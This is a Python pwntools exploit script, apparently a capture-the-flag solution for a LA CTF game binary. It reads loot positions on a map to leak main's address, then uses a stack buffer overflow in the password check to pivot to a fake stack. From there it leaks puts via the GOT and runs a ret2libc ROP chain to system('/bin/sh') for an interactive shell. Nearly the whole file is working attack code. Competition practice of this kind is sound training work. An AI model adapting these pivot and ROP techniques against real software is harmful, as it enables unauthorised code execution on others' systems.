#!/usr/bin/env python3
# pylint: disable=all
from pwn import *
from os import getcwd
from subprocess import run

# -------------------------- INFO -------------------------- #
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

# ------------------------- TARGET ------------------------- #
exe = context.binary = ELF(args.EXE or "./chall")

# ------------------------- REMOTE ------------------------- #
host = args.HOST or "chall.lac.tf"
port = int(args.PORT or 31337)

# -------------------------- LIBC -------------------------- #
libc = ELF(args.LIBC or "./libc.so.6")

# -------------------------- START ------------------------- #
gdbscript = """
source showboard.py
b *check_flag_password+379
c
"""

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe.path)
    if args.DBG:
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #


def get_libc_base(pid) -> int:
    result = run(
        f"cat /proc/{pid}/maps | grep libc.so.6 | head -n 1 | cut -d '-' -f1",
        capture_output=True,
        shell=True,
        text=True,
    )
    return int("0x" + result.stdout, 16)


move_count = 0

loots = {"Sword": 0, "Shield": 1, "Potion": 2, "Key": 3, "Scroll": 4, "Amulet": 5}

found_loot = {}


def go_down(x, y):
    global move_count
    move_count += 1
    p.sendline(b"s")
    return handle_loot(x, y)


def go_right(x, y):
    global move_count
    move_count += 1
    p.sendline(b"e")
    return handle_loot(x, y)


def go_left(x, y):
    global move_count
    move_count += 1
    p.sendline(b"w")
    return handle_loot(x, y)


def handle_loot(x, y):
    global found_loot
    data = p.recvuntil(b"> ").decode(errors="ignore")
    for i in loots.keys():
        if i in data:
            found_loot[loots[i]] = (x, y)
            info("Found loot: %s at (%d, %d)", i, x, y)


# Iterate map to find loot
rows = 16
cols = 16
for y in range(rows):
    if y % 2 == 0:
        for x in range(cols):
            go_right(x, y)
    else:
        for x in range(cols - 1, 0, -1):
            go_left(x, y)
    go_down(x, y)

info("All loot: %s", str(dict(sorted(found_loot.items()))))

# Compose main address
main_address = ""
for i in range(len(loots)):
    x, y = found_loot[i]
    main_address = hex(x)[2:] + hex(y)[2:] + main_address
main_address = int("0x" + main_address, 16)
info("Composed main address: 0x%x", main_address)

# Compose ELF address
exe.address = main_address - exe.sym.main
rop = ROP(exe)
info("ELF address: 0x%x", exe.address)

# Go to Flag cell
p.sendline(b"help")
for i in range(16):
    p.sendlineafter(b"> ", b"n")

# Compose fake stack
fake_stack_addr = exe.sym.history + 2248 + 32
info("Fake stack address: 0x%x", fake_stack_addr)
p.sendlineafter(b"> ", p64(exe.got.puts).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(0xCAFEBABE).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(0xCAFEBABE).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(0xCAFEBABE).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(fake_stack_addr + 16).rstrip(b"\x00"))  # RBP
p.sendlineafter(b"> ", p64(exe.sym.move_player + 204).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(0xCAFEBABE).rstrip(b"\x00"))
p.sendlineafter(b"> ", p64(exe.sym.main).rstrip(b"\x00"))

# Stack buffer overflow in check_flag_password to jump to fake stack
payload = b""
payload += b"A" * 16
payload += p64(fake_stack_addr)  # RBP
payload += p64(exe.address + 0x1E7C)  # RSP, mov eax, 0; leave; ret;

p.sendlineafter(b"> ", b"grab")
p.sendlineafter(b"Password: ", payload)

# Get GOT leak
leak = p.recvline_contains(b"venture")
leak = u64(leak[14:].removesuffix(b"...").ljust(8, b"\x00"))
info(b"GOT LEAK: 0x%x", leak)

# Calculate LIBC address
libc.address = leak - libc.sym.puts
info(b"LIBC LEAK: 0x%x", libc.address)
rop_libc = ROP(libc)

# Fake stack with ROP chain
p.sendlineafter(b"> ", p64(rop_libc.find_gadget(["pop rdi", "ret"]).address)[:6])
p.sendlineafter(b"> ", p64(next(libc.search(b"/bin/sh\x00")))[:6])
p.sendlineafter(b"> ", p64(rop_libc.find_gadget(["ret"]).address)[:6])
p.sendlineafter(b"> ", p64(libc.sym.system)[:6])

payload = b""
payload += b"A" * 16
payload += p64(fake_stack_addr + 40)  # RBP
payload += p64(rop.find_gadget(["leave", "ret"]).address)  # RSP

p.sendlineafter(b"> ", b"grab")
p.sendlineafter(b"Password: ", payload)

p.interactive()
